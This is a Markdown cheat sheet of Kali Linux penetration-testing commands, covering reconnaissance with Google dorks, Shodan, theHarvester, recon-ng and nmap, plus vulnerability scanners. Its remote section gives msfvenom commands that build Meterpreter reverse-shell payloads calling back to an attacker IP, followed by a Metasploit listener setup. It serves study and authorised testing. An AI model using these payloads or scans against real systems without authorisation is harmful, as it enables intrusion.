# kali penetration testing

## passive reconnaissance

### [Google](https://www.google.com/)

site: oreilly filetype: pdf

inurl: oreilly.com intext: penetrantion


### [Shodan](https://www.shodan.io/)

country:tw city:taipei port:80 net:210.xxx.xxx.xxx/24

org:google isp:hinet hostname:noip version:4.2 geo:25,121 product:windows


### [ZoomEye](https://www.zoomeye.org/)


### whois

web or cli

```bash
kali:~ # whois oreilly.com
kali:~ # whois 8.8.8.8
```


### [theHarvester](https://github.com/laramies/theHarvester)

```bash
kali:~ # theHarvester -d demo.testfire.net -b google -l 20
kali:~ # theHarvester -d testfire.net -b all -l 20
```


### [recon-ng](https://github.com/lanmaster53/recon-ng)

```bash
kali:~ # recon-ng
[recon-ng][default] > marketplace refresh
[recon-ng][default] > marketplace search netblock
[recon-ng][default] > marketplace install recon/netblocks-hosts/reverse_resolve
```

[lanmaster53/recon-ng-marketplace](https://github.com/lanmaster53/recon-ng-marketplace/tree/master/modules/recon)


### [maltego](https://www.maltego.com/)


### [sn0int](https://github.com/kpcyrd/sn0int)


### nslookup


### dig


### dnsrecon


---

## active reconnaissance

### [nmap](https://nmap.org/)

host discovery -> port scanning -> version detection -> os detection

#### ip

```bash
# single ip
kali:~ # nmap 192.168.0.10

# multi ip
kali:~ # nmap 192.168.0.10 192.168.0.20

# ip range
kali:~ # nmap 192.168.0.10-20

# ip mask
kali:~ # nmap 192.168.0.0/24
```


#### port

```bash
# single port
kali:~ # nmap -p 22 <ip>
kali:~ # nmap -p T:22 <ip>      # only tcp port

# multi port
kali:~ # nmap -p 21,23 192.168.0.1

# port range
kali:~ # nmap -p 20-23 192.168.0.1

# all port 1 ~ 65535
kali:~ # nmap -p- 192.168.0.1
```


#### host discovery

```bash
# arp
kali:~ # nmap -sn <ip>      # ping scan

# icmp
kali:~ # nmap -PE <ip>      # ICMP echo
kali:~ # nmap -PP <ip>      # ICMP timestamp
kali:~ # nmap -PM <ip>      # ICMP netmask

# tcp / udp
kali:~ # nmap -PS <ip>      # TCP SYN ping
kali:~ # nmap -PA <ip>      # TCP ACK ping
kali:~ # nmap -PU <ip>      # UDP ping
```

#### port scanning

```bash
# tcp
kali:~ # nmap -sT <ip>       # TCP connect scan
kali:~ # nmap -sS <ip>       # TCP SYN scan
kali:~ # nmap -sA <ip>       # TCP ACK scan
kali:~ # nmap -sN <ip>       # TCP NULL scan
kali:~ # nmap -sF <ip>       # TCP FIN scan
kali:~ # nmap -sX <ip>       # TCP Xmas (FIN, PSH, and URG) scan
kali:~ # nmap -sW <ip>       # TCP Window scan
kali:~ # nmap -sM <ip>       # TCP Maimon scan

# udp
kali:~ # nmap -sU <ip>       # UDP scan
```

#### version detection

```bash
kali:~ # nmap -sV <ip>       # app/service version
```


#### os detection

```bash
kali:~ # nmap -O <ip>        # app/service version
```


#### nse - nmap script engine

```bash
kali:~ # ls /usr/share/nmap/scripts
kali:~ # grep categories /usr/share/nmap/scripts/*

kali:~ # nmap --script-help default
kali:~ # nmap --script-help ssh-run
kali:~ # nmap -sC <ip>                                      # -sC = --script="default"

# script-file
kali:~ # nmap --script="http-title" <ip>                    # single
kali:~ # nmap --script="ssh-run,http-title"                 # multi

# script-category
kali:~ # nmap --script="default" <ip>                       # single
kali:~ # nmap --script="default,safe,brute,exploit" <ip>    # multi

# other
kali:~ # namp "http-*" <ip>
kali:~ # namp "not intrusive" <ip>
kali:~ # namp "default or safe" <ip>
kali:~ # namp "default and safe" <ip>
```


#### output

```bash
kali:~ # namp -oN <file>        # normal
kali:~ # namp -oX <file>        # xml
kali:~ # namp -oS <file>        # script kiddle
kali:~ # namp -oG <file>        # grepable
kali:~ # namp -oA <file>        # all
```


#### zenmap


### [dirb](http://dirb.sourceforge.net/)

```bash
kail:~ # dirb http://<ip>/<context>
```


### whatweb

```bash
kail:~ # whatweb http://<ip>/<context>
```


---

## vulnerability

### [CVE](https://cve.mitre.org/)


### [EXPLOIT DATABASE](https://www.exploit-db.com/)


### [nmap](https://nmap.org/)

```bash
kali:~ # nmap --script vuln <ip>
```


### [OpenVAS](https://www.openvas.org/)


### [Rapid7 Nexpose](https://www.rapid7.com/products/nexpose/)


### [tenable nessus](https://www.tenable.com/products/nessus)


### zaproxy

```bash
kali:~ # apt update
kali:~ # apt install zaproxy
```


---

## remote

### [msfpc](https://github.com/g0tmi1k/msfpc)

```bash
kali:~ # msfpc -h
```


### metasploit framework

```
kali     target machine
   |          |
   |          |
   +----------+...
```

```bash
kali:~ # msfvenom -h
kali:~ # msfvenom -l payloads|format|archs
kali:~ # msfvenom -p <payload> LHOST=<kali ip> LPORT=<kali port> -f <format> -o <file>
# LHOST: local host, LPORT: local port
# example
kali:~ # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f elf -o hacker    # for linux
kali:~ # msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f exe -o hacker.exe  # for windows
```

```bash
kali:~ # msfconsole
msf6 > help
msf6 > help use
msf6 > use exploit/multi/handler
msf6 > show options
msf6 > set LHOST <kali ip>
msf6 > set LPORT <kali port>
msf6 > exploit
```


---

## ref

[Kali Docs](https://www.kali.org/docs/)

[Kali Tools](https://www.kali.org/tools/)

[Nmap Network Scanning](https://nmap.org/book/toc.html)

[METASPLOIT UNLEASHED](https://www.offensive-security.com/metasploit-unleashed/)

[大学霸 Kali Linux 安全渗透教程](https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/index.html)
